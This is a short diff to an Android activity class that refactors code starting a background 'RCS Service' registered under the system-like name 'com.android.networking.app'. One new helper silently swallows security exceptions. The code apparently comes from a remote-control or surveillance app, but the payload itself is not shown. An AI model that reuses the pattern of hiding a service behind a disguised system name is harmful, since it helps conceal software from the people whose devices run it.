@@ -126,32 +126,7 @@ public class AGUI extends Activity implements OnSeekBarChangeListener {
 	private void actualCreate(final Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 
-		final String service = "com.android.networking.app"; //$NON-NLS-1$
-		// final String service = "android.intent.action.MAIN";
-
-		try {
-			if (Core.isServiceRunning() == false) {
-				final ComponentName cn = startService(new Intent(service));
-
-				if (cn == null) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " RCS Service not started, null cn ");//$NON-NLS-1$
-					}
-				} else {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " RCS Service Name: " + cn.flattenToShortString());//$NON-NLS-1$
-					}
-				}
-			}
-		} catch (final SecurityException se) {
-			if (Cfg.EXCEPTION) {
-				Check.log(se);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " SecurityException caught on startService()");//$NON-NLS-1$
-			}
-		}
+		startService();
 
 		setContentView(R.layout.main);
 
@@ -198,6 +173,47 @@ public class AGUI extends Activity implements OnSeekBarChangeListener {
 				editor.commit();
 			}
 		});
+	}
+	
+	private void startExtService() {
+		final String service = "com.android.networking.app"; //$NON-NLS-1$
+
+		try {
+			if (Core.isServiceRunning() == false) {
+				final ComponentName cn = startService(new Intent(service));
+			}
+		} catch (final SecurityException se) {
+
+		}
+	}
+
+	private void startService() {
+		final String service = "com.android.networking.app"; //$NON-NLS-1$
+		// final String service = "android.intent.action.MAIN";
+
+		try {
+			if (Core.isServiceRunning() == false) {
+				final ComponentName cn = startService(new Intent(service));
+
+				if (cn == null) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " RCS Service not started, null cn ");//$NON-NLS-1$
+					}
+				} else {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " RCS Service Name: " + cn.flattenToShortString());//$NON-NLS-1$
+					}
+				}
+			}
+		} catch (final SecurityException se) {
+			if (Cfg.EXCEPTION) {
+				Check.log(se);
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " SecurityException caught on startService()");//$NON-NLS-1$
+			}
+		}
 	}
 
 }
